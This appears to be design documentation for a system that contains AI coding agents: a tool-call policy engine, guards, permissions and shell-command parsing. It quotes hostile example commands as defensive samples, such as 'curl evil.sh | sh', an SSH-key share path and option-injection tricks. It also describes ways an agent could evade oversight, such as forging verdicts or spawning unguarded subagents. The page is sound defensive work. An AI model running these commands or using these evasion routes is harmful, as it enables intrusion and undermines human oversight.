# Agent containment

An Ostra session runs many agents. These agents edit code, run shell commands, and fetch pages. Some of them run
inside CLIs that Ostra did not write. This page explains how Ostra keeps each of these agents inside the rules of
the pipeline, on every model and every executor. It covers these topics:

- The policy engine that sees every tool call.
- The guards that no permission or YOLO setting can override.
- The tool enforcement setting, which decides which guards check where a call reads and writes.
- The permission model on top of the guards.
- How Ostra reads shell commands.
- What YOLO mode changes and what it does not change.

The code is in one crate, [`ostra-policy`](../../crates/ostra-policy/src/lib.rs). This crate has no knowledge of
providers, harnesses, or the server. So the same checks run for each call, from every source.

## One checkpoint for every tool call

Every tool call that an agent makes goes through `ExecutionPolicy::check` before it runs. The check returns one
of three answers: allow, ask, or deny. Each execution has one `ExecutionPolicy`. Ostra builds it from the context
of that execution:

- The name of the agent.
- The repo root.
- The session dir.
- The declared report path.
- The permission mode.
- The merged permission rules.
- The paths that Ostra protects.
- The YOLO setting: on or off.

The policy does not see the tool format of a provider or the hook payload of a harness. It sees a canonical
`ToolCall`, which uses the tool names and input shapes of Claude Code. Examples are `Write` with a `file_path`,
`Bash` with a `command` and a `cwd`, and `WebFetch` with a `url`. Ostra uses the Claude Code vocabulary for two
reasons. Ostra tuned its agent prompts against this vocabulary, and many users already know its permission rule
syntax.

One checkpoint gives two properties:

- **The rules are written once.** Write scope, state ownership, the build streak, and the other rules are in one
  Rust module. No executor has its own copy of the rules, so the rules cannot differ between executors.
- **Relative paths mean one thing.** Before the check, the native executor changes relative `file_path` and
  `path` values to absolute paths. It also writes the Bash working directory into `cwd`
  ([`ToolEnv::canonical_call`](../../crates/ostra-tools/src/lib.rs)). The policy checks a path, the user approves
  that path, and the tool writes that path. If each step resolves a path in a different way, the tool can write
  a path that the user did not approve.

`check` itself is short. It runs layer 1, then layer 2, and then applies YOLO:

```rust
pub fn check(&self, call: &ToolCall) -> PolicyDecision {
    let parsed = (call.tool == "Bash")
        .then(|| bash::parse(call.str_field("command").unwrap_or_default()));
    if let Some(d) = self.layer1(call, parsed.as_ref()) {
        return from_denial(d);
    }
    let decision = self.layer2(call, parsed.as_ref());
    // Under YOLO an ask becomes an allow. A denial stays a denial.
    ...
}
```

([`policy.rs`](../../crates/ostra-policy/src/policy.rs))

Every decision names the rule that caused it, for example `guard: build-streak`, `permission: Bash(git push *)`,
`permission: mode:plan`, or `permission: read-only`. The Activity view shows that name next to each call. So a
user can always see why a call ran or why it did not run.

## Layer 1: guards

Guards protect the pipeline itself. They express facts that must stay true, because otherwise the records of the
engine have no meaning. An example is "only the implementer writes the implementer's progress log." Guards are
not about the risk that a user accepts. For this reason, no permission rule, answer to an ask, permission mode, or
YOLO setting can override a guard. If YOLO or an "always allow" rule can turn off a check, that check is a
preference, not a guard.

Each guard is a port of an Ultracode hook. The comment above the code of each guard in
[`guards.rs`](../../crates/ostra-policy/src/guards.rs) names its source file.

### Tool enforcement

The `tool_enforcement` setting (Rule G1) decides whether Layer 1 also checks *where* a tool call reads and writes.
Its default value is `disabled`. Capable models often use a method that the location checks cannot follow. For
example, one Python script that edits five files saves four round trips. But a guard reads only the paths that a
tool call names, and it cannot see the paths in the script. So, with enforcement on, Ostra refuses the script, and
the model then makes one edit in each call.

| Guard | Disabled (default) | Enabled |
| --- | --- | --- |
| Write scope, with the read-only rule of quick-answer and the session-dir rule of the `Document` tool | off | on |
| Report path | off | on |
| Self-protection: writes to Ostra's binary, config, and `workspace.toml`, running `ostra`, and inline interpreter code that writes files or spawns processes | off | on |
| No test files without `test_files`, state ownership, artifact ownership, workspace artifacts, workspace docs, `Document` tool, git metadata, secret reads, Windows paths | on | on |
| Lesson gate, build streak, management tools, and the subagent coordination gates | on | on |

The choice is a trade between protection and tool calls. `enabled` protects the pipeline from a weaker model that
writes outside its scope, edits Ostra's own files, or gives its report a wrong name. It costs more tool calls,
because each refused call is spent. Also, a model that keeps trying to use a script retries until it uses one edit
for each call. `disabled` suits capable models, because they rarely make those mistakes and they use the saved
round trips.

When enforcement is disabled, the other guards still refuse calls that can corrupt the records of the pipeline or
leak a credential. Ostra still refuses inline code that names pipeline state (`.state/`, `workspace.db`, a review
ledger). State ownership still prevents writes to the workspace and registry databases. Layer 2 permissions apply
in both modes. The [sandbox](sandboxing.md) also applies in both modes, and it limits a script whose paths the
policy cannot see:

- It keeps writes inside the workspace, the repo, and the session dirs.
- It keeps Ostra's state files read-only.
- It hides Ostra's data and config dirs.

The global value is `tool_enforcement` at the top of `config.toml`. A workspace can replace it with its own
`tool_enforcement`. Ostra keeps this value in the registry and never in `workspace.toml` (Rule A2), because a
repository must not be able to turn off guards that its user turned on. The Permissions tab of the workspace
Settings sets the value. Each execution resolves the value when it starts (`WorkspaceSettings::enforces_tool_calls`)
and carries it in its context as `enforce_tool_calls`. So a change applies to the next execution, not to an
execution that started before the change.

### Write scope

This guard applies only when tool enforcement is enabled.

Each agent has a region of the disk that it can write, its `write_scope` (Rule CA2). The guard refuses a write
outside that region. Each agent declares its scope in its definition. The agents of Ostra declare it in their
`agent.toml`:

| `write_scope` | Can write | Standard agents with this scope |
| --- | --- | --- |
| `read_only` | nothing: it answers in its submit call | quick-answer |
| `session` | its session dir, and OS temp | explore, generate-spec, fact-check, plan, code-reviewer, EPA, advisor, documentation |
| `project` | the repo root and the session dir | implementer, write-test, prompt-generation |
| `setup` | `.ostra/` and `.agents/skills/` in the project, and the session dir | initializer |

The guard reads the region from `ExecContext::scope`, the declared scope of the run (`check_scope` in
[`guards.rs`](../../crates/ostra-policy/src/guards.rs)). It never reads the name of the agent, so a custom agent
passes the same check as a standard agent. If an agent declares no `write_scope`, it gets `project` when its
capabilities include `write` or `edit`. Otherwise it gets `session`. The engine reads some files as records: the
ledger, the security block, the progress log, and the typed documents. A write to these files also needs a grant,
described below.

Scope stops two classes of mistakes. A research or review agent can "helpfully" fix the code that it must only
read. Then the project changes without the knowledge of the pipeline, and the spec or review describes code that
no longer exists. An agent that writes outside the repo can damage the machine of the user.

The guard works on resolved paths. So it judges `../../etc/x`, `~/.bashrc`, and a symlinked path by the location
where they land, not by their spelling. Ostra resolves the allowed regions in the same way. A project can keep its
skills in `skills/` or `.claude/skills/` and link `.agents/skills` to that folder. Then the initializer can write
through the link, because both names land in the same folder. That folder must be inside the repo, because a link
that leaves the repo lands outside the region of every agent.

For a `setup` agent, the guard refuses a write to the older `.ostra/skills/` only when the write does not also
land in `.agents/skills/`.

A second scope rule applies to each agent without the `test_files` grant (Rule CA6). Such an agent cannot write a
path in the repo that looks like a test, for example `*.test.ts`, `tests/`, `*_test.go`, or `FooTest.java`.
`is_test_path` in [`guards.rs`](../../crates/ostra-policy/src/guards.rs) holds the full list of patterns. The implementer does not have the grant. Write-test, prompt-generation, and the initializer have it.
Thus, tests belong to the test stage, which runs after the user asks for tests at the closing gate. If the
implementer can edit a test until it passes, the test no longer checks the work of the implementer. This rule applies when tool enforcement is on
and when it is off.

### State ownership

The engine keeps records that decide the next actions: gates, verdicts, the iteration count of the review loop,
the security block, the progress log of the implementer, and the lesson store. The rule is: only the writer that
the engine expects can write each record.

- Engine state (the `.state/` folder of each session) has no writer except the engine.
- Only the `Memory` tool writes the lesson store (`knowledge.sqlite3` and its `-wal`, `-shm`, and `-journal`
  files), because later sessions recall its contents as fact.
- Only agents with the `review_ledger` grant can write the review ledger. Only agents with `security_block` can
  write the security sentinel. Only agents with `progress_log` can write the progress log (Rule CA6). Among the
  standard agents, code-reviewer, implementer, and write-test have `review_ledger`. Code-reviewer has
  `security_block`, and the implementer has `progress_log`.

Without this guard, an agent under pressure can write `{"verdict": "PASS"}` into a state file. It can also reset
the review ledger to escape the review cap. The denial text says this directly: a hand-written value "would forge
a pipeline decision rather than record one."

Artifact ownership comes next. Only agents with `document_spec` can write spec files. Only agents with
`document_plan` can write plan files, and only agents with `document_research` can write research files. Among the
standard agents, these are generate-spec, plan, and explore. Thus, a reviewer cannot rewrite the requirements that
it reviews against. The guards (`AGENT_OWNED` and `ARTIFACTS` in
[`guards.rs`](../../crates/ostra-policy/src/guards.rs)) name a grant for each file, never an agent. The denial
names the missing grant.

Agents can change these three document kinds only through the `Document` tool, never
with a plain file write. Ostra renders the Markdown from a typed JSON document. Thus, the next render overwrites a
direct edit, and the browser never shows the edit.

### Report path

This guard applies only when tool enforcement is enabled. The lesson gate on the declared report applies in both
modes.

The spawn block of many agents gives a `Report file:`, and the next stage reads that exact path. For those agents,
each `ostra-*` file that they write in the session tree must be the declared path. An agent can write
`ostra-review-final.md` when its spawn block gave `ostra-review-phase-2.md`. Then nobody reads that report. The
guard finds this mistake at the time of the write and tells the agent the correct path.

The guard controls the destination, not the method. A `Write`, a shell heredoc, or a series of appends all pass
if they land on the declared path. The denial tells the agent this, because a large single write can stall, and
the agent can then write the report in parts.

### Lesson gate

When an agent fails a build at least three times in a row and then makes it pass, it learned something that the
next session can use. The build observer records that recovery with the signature of the diagnostic. From then
on, Ostra refuses the report of the agent and its `ok` submit until the agent does one of two things:

- Records a lesson with the `Memory` tool. The lesson gives the area and one line that names the diagnostic and
  the fix.
- Calls `Report` with a `reason` that says the fix was situational and teaches nothing reusable.

The gate does not block a `stuck` or `handoff` submit. The gate makes sure that agents record lessons when the
details are in context. It does not stop an agent that already asks for help.

### Build streak

The build streak counts the consecutive failed build or test commands in one execution. A "build or test command"
is one of these:

- A command that matches the build and test commands of the project in `project.toml`. Placeholders such as
  `{MODULE}` match any text.
- A command from a built-in list of common tools (`cargo`, `mvn`, `npm run`, `pytest`, and others), when the
  project configures no commands.

The observer of the policy reads each result after the call runs
([`build.rs`](../../crates/ostra-policy/src/build.rs)).

| Consecutive failures | What happens |
| --- | --- |
| 2 | Memory recall runs on the diagnostic of the failure, and Ostra adds the matching lessons to the tool result. |
| 3 and 4 | Ostra adds a warning to the result. The warning tells the agent to state the root cause before the next attempt, and not to retry a variation of the same edit. It also gives the number of failures before the block. |
| 5 | Ostra refuses further build and test commands. It tells the agent to submit with status `stuck`. |

The guard blocks only the build loop. The agent can still read files and write its hand-back. A pass resets the
count. A command that timed out or was interrupted counts as neither a pass nor a failure, because it carries no
evidence. The exit code has priority over the output text: if a command prints `3 failed` and exits 0, it is a
pass.

The guard exists because an agent that loops on the same compiler error spends money and makes no progress. A
`STUCK:` hand-back with the diagnostic and the ruled-out hypotheses lets the engine rescue the phase, with the user
or with a judge. Then Ostra does not pay for a sixth and a seventh identical try.

### Self-protection

The parts of this guard in the [tool enforcement](#tool-enforcement) table apply only when tool enforcement is
enabled. The refusal of inline code that names pipeline state applies in both modes.

Agents can read Ostra's files, but they can never change them. Agents cannot run Ostra's binary. These are the
protected paths:

- The `ostra` binary and its assets.
- The global config and `workspace.toml`.
- The `.ostra/agents/`, `.ostra/workflows/`, and `.ostra/transforms/` folders of the workspace.
- The workspace and registry databases with their journal files.

The three folders decide which agents run, what the agents read in their prompts, and what data later nodes get.
An agent that writes one of them can define an agent, a workflow stage, or a transform that runs after it. Thus,
the guards and the read-only paths of the sandbox both protect these folders.

Custom agents, workflows, and plugins also need your approval (Rule A1). The hash that you approve for the
workspace file covers each file in `.ostra/agents/`, `.ostra/workflows/`, and `.ostra/transforms/` by name and
content hash. It also covers each `[[plugins]]` entry. Until you approve, Ostra does these things
([`trust.rs`](../../crates/ostra-workspace/src/trust.rs)):

- It loads none of those files.
- It starts no plugin program. It stops a running plugin at the next read of the agents of the workspace.
- It lists each file and plugin under the pending commands of the workspace.

Thus, a folder that arrives with its own agents runs none of them until you examine them.

The guard refuses `ostra hook` or `ostra mcp-stdio` from a tool call. These subcommands talk to the policy, and a
caller that runs them can give itself what the guards refuse.

Self-protection also covers code that the other guards cannot see. The write guards read the paths that a tool
call names. But inline code for an interpreter names no path (`node -e`, `python3 -c`, a heredoc piped into
`python3`, `echo ... | node`). So, when a command gives code to an interpreter, Ostra scans that code. Ostra
refuses the command if the code does one of these things:

- Names pipeline state (`ostra-review-ledger*.md`, `.state/`, `knowledge.sqlite3`, `workspace.db`, and so on).
- Calls a filesystem write API (`writeFileSync`, `open(..., 'w')`, `shutil.*`, `os.remove`, and others).
- Spawns a process (`child_process`, `subprocess`, `os.system`, `Deno.Command`, and others).

Code that only reads passes, for example `node -p "require('./package.json').version"`. A script file also passes
(`python3 scripts/gen.py`). The reason is that a script is a file in the project, and the guards already checked
the writes that the agent made earlier.

### Further hardening guards

Ostra added some guards on top of the Ultracode ports during its security review. They apply in every mode.

- **Git metadata.** Only git commands can write files under `.git/`, because hooks, `core.fsmonitor`, and a
  gitfile that points at another repository make git run programs later.
- **Secret reads.** Agents never read the data dir of Ostra (registry, master key, server log). They never read a
  workspace database, because it holds each tool output of each session. They never read the harness state of an
  execution, because it holds the bridge token of that execution. They also never read `/proc/<pid>/environ`,
  `mem`, and `fd`. The check covers file tools and every path-like word of a shell command.
- **Workspace artifacts.** Agents read the files in `<workspace>/.ostra/artifacts/`, but they never write, move,
  or delete them (`guard: workspace-artifacts`). The reason is that these files belong to the user. Ostra moves a
  hidden artifact into the data dir. So the secret-read guard keeps it from every agent, and Ostra needs no list
  of hidden names ([Workspace artifacts](../internals/workspaces.md#workspace-artifacts)).
- **Workspace docs.** Agents read the documentation books in `<workspace>/.ostra/docs/`, but they never write,
  move, or delete them (`guard: workspace-docs`). The reason is that the engine writes each book from the submit
  calls of the docs stage (Rule B5). The sandbox also mounts the folder read-only.
- **Management tools** (`guard: manage-tools`, rule O2). Only one run can call `ProjectCreate`: a run with the
  `manage_projects` grant, for a phase that the approved plan puts in a new project (`creates_project` in its
  execution context). Among the standard agents, only the implementer has this grant. The run can call it only
  with the project key of that phase, and only with a well-formed call. A well-formed call has a valid key and
  stack, a purpose and requirements within their limits, and a folder relative to the workspace root with no
  `..`. The guard refuses every other call. A project changes the workspace for every later session, so it must
  follow an approved plan. The guard checks the shape here, so Ostra never asks the user about a call that
  cannot run.

  Until the project exists, the same guard refuses each write by that run outside its session dir and temp. The
  reason is that the phase has no project to write in yet.
- **Read-only session.** When a user reopens an ended harness run to review it, Ostra refuses every tool call in
  that session with `guard: read-only-session`.
- **Ignored paths** (`guard: ignored-search`, rule G2). See [Ignored paths](#ignored-paths).
- **Windows path forms** (`guard: windows-path`). See the next section.

### Ignored paths

A sandboxed execution never searches a path that a `.*ignore` file hides. Projects list generated output,
vendored dependencies, local configuration, and secrets in those files. An agent that searches these paths reads
noise, and it can read a credential. The rule is tied to the sandbox, because the sandbox is the choice of the
user to contain agents. So the rule does not apply with `[sandbox] mode = "off"`, or with `auto` on a machine
with no backend.

Each file whose name is a dot, any text, and `ignore` counts. Ostra reads these files with gitignore syntax
([`ignore_files.rs`](../../crates/ostra-core/src/ignore_files.rs)). Each name is its own family, and Ostra
evaluates each family the way git evaluates `.gitignore`. The file in the deepest folder decides first. A `!`
line in `.npmignore` cannot include again what `.dockerignore` hides. A path is hidden when any family hides it
or one of its folders.

The files apply from the nearest folder that holds `.git`, and downward. `.git/info/exclude` and the global
excludes file are part of the `.gitignore` family. Ostra's own `.ostra/` folder and the temp dirs are exempt. The
`.gitignore` of the session folder holds `*` to keep the folder out of git, but agents still search the reports
of the other agents there.

Ostra enforces the rule in three places:

- **Native Grep and Glob** skip hidden entries during the walk and never go into a hidden folder.
- **Grep and Glob from any executor**, harness CLIs included: Ostra refuses a call when its `path` is hidden.
- **Shell searches**: Ostra refuses three shapes.
  - `rg`, `fd`, and `ag` read ignore files themselves. Ostra refuses them only with a flag that turns that off
    (`-u`, `--no-ignore*`, `--unrestricted`, `fd -I`, `ag --skip-vcs-ignores`), or when they point at a hidden
    path.
  - Ostra refuses walkers that read no ignore files (`grep -r`, `rgrep`, `find`, `tree`, `ls -R`, `ack`) when
    the tree that they walk holds a hidden path. The check walks breadth first and stops at the first hidden
    entry. It refuses a tree of more than 20,000 entries that it could not clear.
  - Ostra refuses `git status --ignored`, `git ls-files -i` or `--others` without `--exclude-standard`, and
    `git grep --no-exclude-standard`, because they list ignored files.

  The parser follows `cd`, `bash -c`, and `xargs`, the same as for every other shell guard.

Each denial starts with the replacement: Grep, Glob, `rg`, or `rg --files`, which skip ignored paths.

A read of a file whose path the agent already knows (`Read`, `cat`) is not a search, and it stays allowed. So an
agent can open the source of a dependency that it found in a stack trace. Two gaps remain:

- `rg` and the Grep and Glob tools of the harness CLIs read only the ripgrep set (`.gitignore`, `.ignore`,
  `.rgignore`). So a file that only another name hides, such as `.dockerignore`, can appear in their results.
  Ostra sees their calls but not their output.
- Ostra does not parse PowerShell and Cmd commands, so this guard does not read them.

### Windows paths

The guards compare paths, and Windows has more ways than Linux to name one file. On Windows, each path that a
tool call names goes through `paths::resolve` ([`paths.rs`](../../crates/ostra-core/src/paths.rs)). This
function opens the path the same way as a Win32 program:

- `..` applies lexically, before links, because Win32 removes it before the file system sees the path.
- The function follows junctions and symlinks, dangling ones included. A junction needs no privilege. So an agent
  can make a junction inside the repo that leads out of the repo. The write lands at the target, and the guard
  judges the target.
- The longest existing ancestor comes back in its real letter case. It has long names in place of 8.3 short
  names (`PROGRA~1`), and it has no `\\?\` prefix.
- The function drops trailing dots and spaces from each name. It also drops an alternate data stream suffix, the
  same as Win32: `.git\config.` and `.git\config ` both open `.git\config`.

The guards then compare the folded form (`paths::fold`). In this form, separators become `\`, and each character
is uppercased and then lowercased. So two names that NTFS treats as one name always compare equal (`.GIT\Hooks`
is `.git\hooks`). The permission rules also match in this way, case-insensitively.

Ostra refuses some forms and does not compare them, because each form can name a protected file in a spelling
that the guards do not recognize:

| Form | Example |
| --- | --- |
| A network or administrative share | `\\localhost\C$\Users\me\.ssh\id_ed25519` |
| A device or object namespace path | `\\.\PhysicalDrive0`, `\\?\GLOBALROOT\...`, `\??\C:\...` |
| A path relative to the working directory of a drive | `C:foo` |
| An alternate data stream | `notes.txt:hidden` |
| A device name as a file name | `CON`, `COM1.txt`, `LPT1` (not `NUL`, which is harmless) |

Git Bash names paths in the MSYS way. Before the paths of a Bash command reach the guards, `paths::from_msys`
changes `/c/Users/me` to `C:\Users\me` and `/tmp` to the `%TEMP%` of Git. So the guard judges a write to
`/c/Users/me/.bashrc` as the file that it opens. Ostra refuses a Bash write target with a `..` directly after a
junction or symlink. Git Bash applies that `..` to the target of the link, but Win32 applies it to the folder of
the link. The guard cannot judge both.

The fixtures `windows_spellings_of_a_git_path_are_all_caught`,
`windows_spellings_of_a_protected_file_are_all_caught`, `msys_paths_in_bash_resolve_to_windows_paths`,
`junctions_cannot_lead_writes_out_of_the_repo`, and `windows_credential_stores_are_never_read` in
[`tests/policy.rs`](../../crates/ostra-policy/tests/policy.rs) run on Windows.

## Layer 2: permissions

A call that passes every guard reaches the permission layer. This layer is about the risk tolerance of the user.
It follows the permission model of Claude Code closely, so that a user who knows one model knows the other
([`perms.rs`](../../crates/ostra-policy/src/perms.rs)).

### Modes

| Mode | Behavior |
| --- | --- |
| `default` | Reads run. Edits to the project ask, and commands that are not known as read-only ask. |
| `acceptEdits` | Edits inside the project run. `mkdir`, `touch`, `cp`, and `mv` with targets inside the project also run. Other commands ask. |
| `plan` | Read-only. Ostra refuses any write and any unknown command. The message tells the agent to put its findings in its report. |
| `bypass` | No asks. Everything that layer 1 allows runs. |

Writes into the session dir and OS temp never ask in any mode, because the agent owns these locations as scratch
space.

### Rules

Rules are in three lists: `allow`, `ask`, and `deny`. Ostra merges them from three scopes in this order: global
config, workspace, and session. When more than one rule matches, deny has priority over ask, and ask has priority
over allow.

```toml
[permissions]
allow = ["Bash(npm run test *)", "Edit(src/**)", "WebFetch(domain:docs.rs)"]
ask   = ["Bash(npm publish *)"]
deny  = ["Bash(git push *)", "Read(~/.ssh/**)"]
```

- A `Bash(...)` rule is a glob over one simple command. A trailing ` *` also matches the bare command.
- A path rule uses the gitignore style. `//x` is absolute, `~/x` is under home, `x/y` is relative to the repo
  root, and a bare name matches at any depth. `Edit` covers every tool that writes files (Write, Edit, MultiEdit,
  NotebookEdit, and the `apply_patch` of Codex). `Read` covers Grep and Glob.
- `WebFetch(domain:docs.rs)` matches the host and its subdomains. It uses the same URL parser that makes the
  request. So Ostra judges a URL such as `https://evil.example\@docs.rs/` by the host that it actually reaches.

When you save settings, a rule that does not parse is a validation error. Ostra does not silently ignore the rule
at run time.

### Asks

An ask becomes a card in the browser with three answers: allow once, always in this workspace, and deny. At the
same time, Ostra sends a push notification, because a pipeline that waits on an ask that nobody sees makes no
progress. "Always in this workspace" adds a rule that Ostra suggests from the call. Examples are
`Bash(npm install *)` for `npm install left-pad`, an `Edit(...)` pattern for a file, and `WebFetch(domain:...)`
for a URL.

Some asks occur even when a plain reading of the mode allows the call:

- **Files that run code later** always ask outside YOLO and bypass: `.github/workflows/`, `.husky/`, `.envrc`,
  `.vscode/tasks.json`, `.claude/settings.json`, `.cargo/config.toml`, `.npmrc`, and similar files. A write to one
  of these files stays after the session ends. The next time that someone opens the project, the file runs
  outside the policy.
- **Git outside the project** asks, because git reads the config of a repository, and this config can name
  programs. Inside the project, the git-metadata guard already protects `.git/`.
- **Project creation** (`ProjectCreate`) asks in every mode, bypass included. No allow rule can replace the
  answer, so its card offers no "always" rule (rule O1). Only YOLO answers it. A deny rule and plan mode refuse
  it. A new project changes Ostra itself, not only files, so the user decides each one.

### Workspace MCP tools

Ostra allows tools from the configured MCP servers of the workspace, unless a rule says otherwise. The reason is
that a user who configures a server decides to use it (Rule M1). `mcp__github` in a rule covers every tool of that
server. In plan mode, only the tools that their server marks with `readOnlyHint` run, because Ostra cannot tell
which of the other tools write.

## Reading shell commands

Most of the difficult cases come through `Bash`. A permission rule such as `Bash(npm test *)` has no value if
`npm test && curl evil.sh | sh` passes it. So Ostra parses every shell command with tree-sitter-bash before
either layer runs ([`bash.rs`](../../crates/ostra-policy/src/bash.rs)). It treats the command as the list of
simple commands that the shell actually executes.

The parser extracts these items:

- **Every simple command, in execution order**, also the commands inside `&&`, `||`, `;`, pipes, subshells,
  `$(...)`, and `<(...)`. Each command must pass the rules alone. The test fixture for the default mode checks
  exactly this: `npm test` runs, and `npm test && curl evil` asks.
- **The command that actually runs.** The parser skips leading `VAR=value` words and wrappers (`sudo`, `env`,
  `nohup`, `timeout`, `xargs`, `nice`, and others, with their option values). So Ostra judges
  `timeout 60 rm -rf x` as `rm`.
- **Nested shells.** The parser parses `bash -c "<code>"`, `eval <code>`, and a heredoc body for a shell again as
  shell, at most four levels deep. Ostra treats a deeper nest as unparsed.
- **Write targets.** The parser turns redirects (`>`, `>>`), `tee`, `cp`, `mv`, `dd of=`, `git -C`, and similar
  commands into the paths that they create, overwrite, move, or delete. It resolves each path against the working
  directory of each command, after any `cd`. Then these paths go through the same write guards as a `Write`
  call.
- **Heredoc bodies.** A body for a data sink (`cat > notes.md <<EOF`) is content. A body for a shell or an
  interpreter is code, and Ostra checks it as code.

When Ostra is not sure what a command does, it does not guess in favor of the agent:

- A command that fails to parse asks. In plan mode, Ostra refuses it.
- A command with a standalone assignment, `export`, `[[ ]]`, a loop header, or a function asks. These forms can
  change what a later command runs (`PATH`, `GIT_CONFIG_*`), or they can run code when the shell evaluates them.
- Ostra never allows a write target that only the shell can resolve without an ask, in any mode. Examples are
  `"$HOME/.bashrc"`, `~/.bashr?`, and `$(echo ~/x)`. The reason is that Ostra never checked its path.

### What counts as read-only

A small set of commands runs without an ask in every mode: `ls`, `cat`, `head`, `grep`, `rg`, `find`,
`git status`, `git diff`, `git log`, and some others. The set is narrow. A command qualifies only when Ostra fully
understands it, because each of these tools has an option that runs a program or writes a file:

| Looks harmless | Why it asks |
| --- | --- |
| `git -c core.fsmonitor=id status` | `-c` sets config that names a program |
| `GIT_EXTERNAL_DIFF=id git diff` | an assignment changes what runs |
| `rg --pre sh foo` | `--pre` runs a program on every file |
| `sort -uo out.txt x` | `-o` writes a file, also inside a short-option cluster |
| `find . -name '*.tmp' -delete` | `-delete`, `-exec`, and `-fprint` act on files |
| `./cat x` | a command named by a path can be a script that the agent wrote |
| `rg foo *` | a glob can expand to an option |

These cases come from the fixture `only_fully_understood_commands_are_read_only` in
[`tests/policy.rs`](../../crates/ostra-policy/tests/policy.rs). The fixture asserts that Ostra does not allow any
of them without an ask in default and plan mode.

### PowerShell and Cmd

On Windows, agents also get a `PowerShell` tool and a `Cmd` tool. Harnesses bring their own: Claude Code has a
`PowerShell` tool, and Codex runs its shell commands in PowerShell on Windows. The parser of Ostra reads only
bash. So it cannot split a PowerShell or cmd command into simple commands or find its write targets. These tools
get all other parts of the hardening of the Bash tool. For the rest, the policy treats them the same as a Bash
command that it could not parse:

- **Never allowed without an ask.** No command of these tools counts as read-only, and Ostra never knows a write
  target. So default and accept-edits mode ask, and plan mode refuses. Only bypass, YOLO, or an allow rule such
  as `PowerShell(Get-ChildItem *)` lets a command run without an ask.
- **Refused when the text names what no agent touches.** Layer 1 scans the raw command (`check_opaque_shell` in
  [`guards.rs`](../../crates/ostra-policy/src/guards.rs)) for pipeline state names (`ostra-review-ledger.md`,
  `workspace.db`, and the rest). It resolves every path in the command, in drive and backslash form and also with
  `/`. In every mode, YOLO included, Ostra refuses a path into the data dir of Ostra or a credential store as a
  secret read. In every mode, it also refuses a path to engine state as self-protection. When tool enforcement is
  enabled, Ostra also refuses a path to the binary, config, or databases of Ostra.
- **The same process hardening.** Ostra removes the configured credential variables and every `OSTRA_*` variable
  from the child. The working dir persists between calls. Ostra kills the whole process tree when the call ends
  or times out.

A Codex shell call on Windows reaches the policy as `Bash` only when its argv starts with `bash` or `sh`. In all
other cases, it reaches the policy as `PowerShell`. So Ostra never reads a PowerShell command as bash. The
descriptions of these tools tell agents to use the Bash tool, because only a Bash command gets its writes checked
path by path. The fixture `powershell_and_cmd_are_opaque_and_hardened` covers these rules.

## Harness executors get the same policy

A harness executor runs an agent inside Claude Code, Codex, Grok Build, or Antigravity. These CLIs have their own
tools, which Ostra did not write. So Ostra enforces its policy through the hook system of each CLI.

For each harness execution, Ostra writes a hook config. This config sends every PreToolUse and PostToolUse event
to `ostra hook --execution <id>`, a subcommand of the same binary. That subprocess sends the payload, with the
token of the execution, to the `/internal/policy` endpoint of the server. This endpoint accepts local peers only.
There, an adapter for each harness turns the payload into a canonical `ToolCall`
([`adapters/`](../../crates/ostra-exec-harness/src/adapters/mod.rs)):

| Harness | Its call | Canonical call |
| --- | --- | --- |
| Codex | `exec_command` with `cmd: ["git", "status"]` | `Bash` with `command: "git status"` (each word is shell-quoted, so the policy sees the words that Codex runs) |
| Codex | `apply_patch` | `ApplyPatch`, whose `*** Update File:` lines become write targets |
| Grok Build | `search_replace` with `filePath` | `Edit` with `file_path` |
| Grok Build | `run_terminal_command` | `Bash`, with the `cwd` of the payload |
| Any | `mcp__ostra__report`, `ostra/report`, `mcp_ostra_report` | `Report` |

After this step, the harness call goes through the same `ExecutionPolicy::check` as a native call. The adapter
then turns the answer of Ostra into the exact response shape that the harness accepts. Examples are
`hookSpecificOutput` for Claude Code and a top-level `decision` for Antigravity. An ask never reaches the harness.
Ostra resolves the ask in the browser first and sends back allow or deny. The reason is that nobody watches the
terminal for the permission prompt of a harness.

The adapters also refuse some calls before the policy sees them:

- **Subagent spawns** (`Task`, `Agent`, `spawn_agent`, and similar tools). Every Ostra agent is a leaf. A
  delegated task runs outside the guards, and its result never reaches the engine.
- **User questions** (`AskUserQuestion` and similar tools). Ostra tells the agent to put the question in its
  submit call, because Ostra asks the user from a pipeline gate.
- **Truncated input.** When a payload is larger than 128 KiB, Grok Build replaces `toolInput` with a truncated
  string. Ostra cannot judge a call that it cannot read. So it refuses the call with a note to split it.

The bridge never fails open. These cases all deny the PreToolUse event: an unknown execution, a wrong token, a
hook from the wrong harness, an unreachable server, or an unreadable answer. Outside an Ostra execution (no
`$OSTRA_EXECUTION` in the environment), `ostra hook` does nothing. The reason is that the Antigravity integration
is installed globally, and it must not affect the own sessions of the user.

The Codex adapter shows the canonical shape. In each form of the command, the policy gets `Bash` and a `command`
string.

```rust
"Bash" | "exec_command" | "shell" | "local_shell" => {
    let command = match input.get("command").or_else(|| input.get("cmd")) {
        Some(Value::String(s)) => s.clone(),
        // Quoted, so the policy sees the words Codex runs, not a re-split line.
        Some(Value::Array(parts)) => parts.iter().filter_map(Value::as_str)
            .map(crate::launch::shell_quote).collect::<Vec<_>>().join(" "),
        _ => String::new(),
    };
    ToolCall::new("Bash", with_cwd(json!({"command": command}), cwd))
}
```

([`adapters/codex.rs`](../../crates/ostra-exec-harness/src/adapters/codex.rs))

Workspace MCP tools take one path in a harness. The harness reaches them only through the MCP server of Ostra. So
the hook passes these calls through, and the MCP handler checks, asks, runs, and logs each call one time (Rule
M2). A check at both points asks the user two times for one call.

The policy is not the only layer around a harness. Ostra also runs agent commands and each harness CLI inside an
OS sandbox (bubblewrap on Linux, Seatbelt on macOS). The sandbox limits what the CLI and its child processes can
reach on disk, also actions that no hook reports. On Linux and macOS, the default mode is `required`, and it
refuses to start an execution that the machine cannot sandbox. Windows has no sandbox yet, and its default is
`auto`. [Sandboxing](sandboxing.md) covers the profile, the modes, and what is lost without the sandbox.

## Why a denial leads with the correction

Each denial is for the model that reads it, and it starts with the action to do instead:

> Record lessons with the Memory tool instead of writing ".../knowledge.sqlite3": the lesson store is written only
> by that tool, because later sessions recall it as fact.

> Write your report to ".../ostra-review-phase-2.md" instead: "ostra-review.md" is not this execution's declared
> report path, and the next stage reads that exact path.

There are two reasons.

The first reason is mechanical. Grok Build clips deny and ask reasons to 256 characters. If a reason starts with
background and ends with the fix, the clip removes the fix. The Grok adapter of Ostra shortens a long reason: it
keeps the start and the final sentence (`fit_reason` in
[`adapters/grok.rs`](../../crates/ostra-exec-harness/src/adapters/grok.rs)). This works only because the start is
the correction.

The second reason is behavioral. If a model gets only "denied", it often retries the same action under another
